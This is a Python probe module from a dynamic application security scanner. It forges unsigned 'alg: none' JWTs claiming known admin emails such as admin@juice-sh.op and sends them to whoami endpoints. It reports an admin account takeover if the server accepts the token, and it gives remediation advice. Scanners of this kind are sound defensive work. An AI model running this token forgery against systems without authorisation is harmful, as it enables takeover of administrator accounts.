#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authentication: server treats the JWT email claim as authoritative
without verifying the signature.

Companion to `auth_jwt_alg_none`. The earlier probe forges an
unsigned token with a randomized marker email; this one specifically
asserts the privileged-email case: an `alg: none` token claiming
`admin@juice-sh.op` (or whatever the documented admin email is) and
`role: admin` is treated as authentic.

The two probes overlap in mechanism but report two different
findings — `auth_jwt_alg_none` flags the alg=none acceptance in the
abstract; this one flags the *concrete admin account takeover*.
Both can be true, both can be false; the orchestrator runs both and
de-dupes downstream.

Detection signal:
  Forge `alg: none` JWT with email claim = <known admin email>,
  GET /rest/user/whoami → response identifies our caller as that
  admin account (email echoed AND no verifier complaint).
"""
from __future__ import annotations

import base64
import json
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

WHOAMI_PATHS = (
    "/rest/user/whoami",
    "/api/me",
    "/api/users/me",
    "/me",
)

# Documented admin emails worth testing as the forged identity.
DEFAULT_ADMINS = (
    "admin@juice-sh.op",
    "admin@example.com",
    "administrator@example.com",
    "root@localhost",
)


def _b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _build_alg_none(email: str) -> str:
    header  = _b64url(json.dumps({"alg": "none", "typ": "JWT"}).encode())
    payload = _b64url(json.dumps({
        "email": email,
        "data": {"email": email, "role": "admin"},
        "role": "admin",
        "iat": 0,
    }).encode())
    return f"{header}.{payload}."


class JwtUnverifiedEmailAdminProbe(Probe):
    name = "auth_jwt_unverified_email_admin"
    summary = ("Detects alg=none JWTs being trusted with a known "
               "admin email — direct admin-account takeover.")
    safety_class = "read-only"

    def add_args(self, parser):
        parser.add_argument(
            "--admin-email", action="append", default=[],
            help="Additional admin email to forge (repeatable).")
        parser.add_argument(
            "--whoami-path", action="append", default=[],
            help="Additional whoami path (repeatable).")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        emails = list(DEFAULT_ADMINS) + list(args.admin_email or [])
        paths  = list(WHOAMI_PATHS)   + list(args.whoami_path or [])

        attempts: list[dict] = []
        confirmed: dict | None = None
        for email in emails:
            token = _build_alg_none(email)
            for path in paths:
                url = urljoin(origin, path)
                r = client.request("GET", url, headers={
                    "Authorization": f"Bearer {token}",
                })
                row: dict = {"email": email, "path": path,
                             "status": r.status, "size": r.size}
                if r.status == 200 and r.body and email in r.text:
                    row["echoed_admin_email"] = email
                    confirmed = row
                    attempts.append(row)
                    break
                attempts.append(row)
            if confirmed:
                break

        evidence = {"origin": origin, "attempts": attempts}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.97,
                summary=(f"Confirmed: forged alg=none JWT with "
                         f"email={confirmed['email']!r} was accepted at "
                         f"{origin}{confirmed['path']} — admin "
                         "account takeover via JWT verification bug."),
                evidence={**evidence, "confirmed": confirmed},
                severity_uplift="critical",
                remediation=(
                    "Same fix as auth_jwt_alg_none: configure the "
                    "verifier with an explicit `algorithms` allowlist "
                    "(e.g. `['RS256']`). Pair with rotation of the "
                    "signing keypair and an audit of every action "
                    "taken by the named admin account during the "
                    "exposure window."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: forged alg=none tokens for "
                     f"{len(emails)} candidate admin emails at "
                     f"{origin}; none echoed the admin identity."),
            evidence=evidence,
        )


if __name__ == "__main__":
    JwtUnverifiedEmailAdminProbe().main()
